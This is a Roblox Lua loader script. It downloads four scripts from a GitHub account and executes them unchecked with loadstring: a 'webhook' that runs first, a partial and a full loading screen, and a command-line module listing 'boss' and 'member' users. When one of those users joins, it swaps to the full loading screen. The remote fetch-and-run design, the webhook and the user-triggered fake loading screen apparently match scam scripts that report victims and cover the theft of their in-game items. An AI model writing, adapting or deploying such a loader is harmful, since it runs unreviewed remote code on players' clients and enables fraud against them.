-- Main Loader Script (Debug Version)
local scriptUrls = {
    webhook = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook",
    halfLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/half%20loading", 
    fullLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/full%20loading",
    cmdLine = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline"
}

-- Better load function with detailed error reporting
local function loadScript(url, scriptName)
    print("ğŸ“¥ Attempting to load: " .. scriptName)
    print("ğŸ”— URL: " .. url)
    
    local success, result = pcall(function()
        local scriptCode = game:HttpGet(url)
        print("âœ… Downloaded " .. scriptName .. " successfully")
        return loadstring(scriptCode)()
    end)
    
    if success then
        print("ğŸ‰ " .. scriptName .. " executed successfully!")
        return true, result
    else
        print("âŒ " .. scriptName .. " FAILED: " .. tostring(result))
        return false, result
    end
end

-- Store references to control loading screens
local HalfLoadingModule = nil
local FullLoadingModule = nil
local CmdLineModule = nil

-- Main execution function
local function initializeScript()
    print("=" . rep("=", 50))
    print("ğŸš€ STARTING MAIN LOADER - DEBUG MODE")
    print("=" . rep("=", 50))
    
    -- Step 1: Execute webhook first
    print("\n1ï¸âƒ£ LOADING WEBHOOK...")
    local webhookSuccess = loadScript(scriptUrls.webhook, "WEBHOOK")
    if webhookSuccess then
        print("âœ… Webhook executed successfully")
    else
        print("âŒ Webhook failed to load")
    end
    
    wait(1)
    
    -- Step 2: Execute half loading screen
    print("\n2ï¸âƒ£ LOADING HALF LOADING SCREEN...")
    local halfLoadingSuccess, halfModule = loadScript(scriptUrls.halfLoading, "HALF LOADING")
    if halfLoadingSuccess then
        print("âœ… Half loading screen started")
        HalfLoadingModule = halfModule
    else
        print("âŒ Half loading screen failed to load")
    end
    
    wait(1)
    
    -- Step 3: Load command line
    print("\n3ï¸âƒ£ LOADING COMMAND LINE...")
    local cmdSuccess, cmdModule = loadScript(scriptUrls.cmdLine, "COMMAND LINE")
    if cmdSuccess then
        print("âœ… Command line loaded")
        CmdLineModule = cmdModule
        
        -- Check if we got authorized users
        if cmdModule and cmdModule.authorizedUsers then
            print("âœ… Authorized users list loaded successfully")
            print("ğŸ‘‘ Boss users: " .. #cmdModule.authorizedUsers.boss)
            print("ğŸ‘¥ Member users: " .. #cmdModule.authorizedUsers.member)
        else
            print("âŒ No authorized users found in command line module")
        end
    else
        print("âŒ Command line failed to load")
    end
    
    print("\n" . rep("=", 50))
    print("ğŸ“‹ INITIALIZATION COMPLETE")
    print("â³ Half loading screen should be running...")
    print("ğŸ‘‘ Waiting for authorized users...")
    print("=" . rep("=", 50))
end

-- Function to check if player is authorized
local function isAuthorizedUser(player)
    if not CmdLineModule then 
        print("âŒ CmdLineModule not available for user check")
        return false 
    end
    
    if not CmdLineModule.authorizedUsers then
        print("âŒ No authorizedUsers in CmdLineModule")
        return false
    end
    
    -- Use the authorized users from cmd line
    local authorizedUsers = CmdLineModule.authorizedUsers
    
    -- Check boss users
    for _, user in ipairs(authorizedUsers.boss) do
        if player.Name == user.username or player.DisplayName == user.displayname then
            print("ğŸ¯ BOSS USER DETECTED: " .. player.Name)
            return true
        end
    end
    
    -- Check member users
    for _, user in ipairs(authorizedUsers.member) do
        if player.Name == user.username or player.DisplayName == user.displayname then
            print("ğŸ¯ MEMBER USER DETECTED: " .. player.Name)
            return true
        end
    end
    
    print("âŒ User NOT authorized: " .. player.Name)
    return false
end

-- Function to upgrade to full loading screen
local function upgradeToFullLoading()
    print("\nğŸ”„ UPGRADING TO FULL LOADING SCREEN...")
    
    -- Stop the half loading screen
    if HalfLoadingModule and HalfLoadingModule.stop then
        print("â¹ï¸ Stopping half loading screen...")
        HalfLoadingModule.stop()
        print("âœ… Half loading screen stopped")
    else
        print("âŒ No HalfLoadingModule or stop function")
    end
    
    wait(1)
    
    -- Execute full loading screen
    print("ğŸ”„ Starting full loading screen...")
    local fullLoadingSuccess, fullModule = loadScript(scriptUrls.fullLoading, "FULL LOADING")
    if fullLoadingSuccess then
        print("âœ… Full loading screen activated")
        FullLoadingModule = fullModule
        return true
    else
        print("âŒ Full loading screen failed to load")
        return false
    end
end

-- Player joining event handler
local function onPlayerJoined(player)
    print("\nğŸ‘¤ Player joined: " .. player.Name)
    print("ğŸ” Checking authorization...")
    
    if isAuthorizedUser(player) then
        print("ğŸ¯ AUTHORIZED USER CONFIRMED: " .. player.Name)
        
        -- Wait a moment then upgrade loading screen
        print("â³ Waiting 2 seconds before upgrade...")
        wait(2)
        upgradeToFullLoading()
    else
        print("âŒ User not authorized: " .. player.Name)
    end
end

-- Connect player joining event
if game.Players then
    print("ğŸ”— Connecting player join event...")
    game.Players.PlayerAdded:Connect(onPlayerJoined)
    
    -- Check existing players
    print("ğŸ” Checking existing players...")
    local players = game.Players:GetPlayers()
    print("ğŸ‘¥ Found " .. #players .. " players in game")
    
    for _, player in pairs(players) do
        print("ğŸ” Checking player: " .. player.Name)
        if isAuthorizedUser(player) then
            print("ğŸ¯ AUTHORIZED USER ALREADY IN GAME: " .. player.Name)
            print("â³ Waiting 2 seconds before upgrade...")
            wait(2)
            upgradeToFullLoading()
            break
        end
    end
else
    print("âŒ game.Players service not available")
end

-- Start the script
print("\nğŸ® STARTING MAIN LOADER...")
initializeScript()

-- Manual test command (you can remove this later)
print("\nğŸ’¡ DEBUG: You can manually test with: upgradeToFullLoading()")
